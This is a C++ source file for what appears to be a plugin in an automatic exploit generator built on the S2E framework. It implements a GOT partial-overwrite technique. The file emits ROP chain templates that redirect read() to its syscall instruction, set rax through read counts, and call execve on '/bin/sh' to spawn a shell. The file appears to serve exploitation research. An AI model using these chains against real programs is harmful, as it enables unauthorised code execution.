// Copyright (C) 2021-2022, Marco Wang
//
// Permission is hereby granted, free of charge, to any person obtaining a copy
// of this software and associated documentation files (the "Software"), to deal
// in the Software without restriction, including without limitation the rights
// to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
// copies of the Software, and to permit persons to whom the Software is
// furnished to do so, subject to the following conditions:
//
// The above copyright notice and this permission notice shall be included in all
// copies or substantial portions of the Software.
//
// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
// IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
// FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
// AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
// LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
// OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
// SOFTWARE.

#include <s2e/Plugins/Requiem/Requiem.h>
#include <s2e/Plugins/Requiem/Utils/StringUtil.h>

#include <cassert>
#include <fstream>

#include "GotPartialOverwrite.h"

namespace s2e::plugins::requiem {

GotPartialOverwrite::GotPartialOverwrite(Requiem &ctx) : Technique(ctx) {
    resolveRequiredGadgets();
}


bool GotPartialOverwrite::checkRequirements() const {
    return true;
}

void GotPartialOverwrite::resolveRequiredGadgets() {
}

std::string GotPartialOverwrite::getAuxiliaryFunctions() const {
    return "";
}

std::vector<std::vector<std::string>> GotPartialOverwrite::getRopChainsList() const {
    return {
        {
            "A8",
            "uROP(elf.sym['read'], 0, elf.got['read'], 1)  # modify LSB of got['read'], setting rax to 1",
            "uROP(elf.sym['read'], 1, 0, 0)                # write(1, 0, 0), setting rax to 0",
            "uROP(elf.sym['read'], 0, elf.bss(), 59)       # read '/bin/sh' into elf.bss(), setting rax to 59",
            "uROP(elf.sym['read'], elf.bss(), 0, 0)        # sys_execve"
        }, {
            format("b'\\x%x'", getLsbOfReadSyscall())
        }, {
            "b'/bin/sh'.ljust(59, b'\\x00')"
        }
    };
}

std::vector<std::string> GotPartialOverwrite::getExtraPayload() const {
    return {"p64(0)"};  // rbp
}

std::string GotPartialOverwrite::toString() const {
    return "GotPartialOverwrite";
}


uint8_t GotPartialOverwrite::getLsbOfReadSyscall() const {
    // Get __read() info from libc.
    auto f = m_ctx.getExploit().getLibc().functions()["__read"];

    std::vector<uint8_t> code(f.size);
    std::ifstream ifs(m_ctx.getExploit().getLibcFilename(), std::ios::binary);
    ifs.seekg(f.address, std::ios::beg);
    ifs.read(reinterpret_cast<char*>(code.data()), f.size);

    uint64_t syscallOffset = -1;
    for (auto i : m_ctx.getDisassembler().disasm(code, f.address)) {
        if (i.mnemonic == "syscall") {
            syscallOffset = i.address;
            assert((syscallOffset & 0xff00) == (f.address & 0xff00));
            break;
        }
    }
    return syscallOffset & 0xff;
}

}  // namespace s2e::plugins::requiem
